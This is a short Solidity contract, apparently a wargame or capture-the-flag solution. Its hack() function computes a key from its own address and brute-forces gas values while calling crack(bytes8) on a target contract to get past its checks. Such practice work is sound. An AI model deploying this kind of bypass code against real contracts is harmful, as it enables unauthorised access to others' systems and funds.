//SPSPDX-License-Identifier: None
pragma solidity ^0.8.0;

contract Test {
    address public target;

    constructor(address target_) {
        target = target_;
    }

    // Remember to manually set GasLimit in Metamask
    // It is suggest to be higher than 300000 if ealy break is applied
    // It is suggest to be higher than 1000000 if ealy break is not applied
    // Be careful for block maximum gas limit
    function hack() public {
        bytes8 key;
        unchecked {
            key = bytes8(uint64(uint160(address(this))) ^ (uint64(0) - 1));
        }

        for (uint256 gasfee = 0; gasfee < 22; gasfee++) {
            (bool success, ) = target.call{gas: gasfee + 30000}(
                abi.encodeWithSignature("crack(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
    }
}
